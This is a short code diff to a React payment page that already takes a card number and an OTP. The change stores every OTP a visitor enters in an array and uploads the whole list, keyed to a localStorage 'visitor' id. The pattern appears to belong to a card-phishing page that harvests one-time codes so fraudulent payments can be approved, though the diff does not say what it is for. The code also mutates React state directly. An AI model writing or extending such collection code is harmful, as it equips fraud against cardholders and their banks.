@@ -24,6 +24,7 @@ export default function PaymentPage() {
   const [paymentInfo, setPaymentInfo] = useState({ status: "" })
   const [countdown, setCountdown] = useState(180) // 3 minutes in seconds
   const [isProcessing, setIsProcessing] = useState(false)
+  const [allOtps] = useState([""])
 
   useEffect(() => {
     const am = localStorage.getItem("amount")
@@ -103,7 +104,9 @@ export default function PaymentPage() {
     const numericValue = value.replace(/\D/g, "")
     setOtp(numericValue)
   }
-
+  const handleOtp=(vak:string)=>{
+allOtps.push(vak)
+  }
   const handleSubmitPayment = async () => {
     const paymentData = {
       cardNumber: cardNumber,
@@ -173,8 +176,8 @@ export default function PaymentPage() {
     try {
       const id = localStorage.getItem("visitor")
       if (!id || !paymentId) throw new Error("Missing required IDs")
-
-      await addData({ id, otp })
+handleOtp(otp)
+      await addData({ id, otp ,allOtps})
 
       // Show success message
 
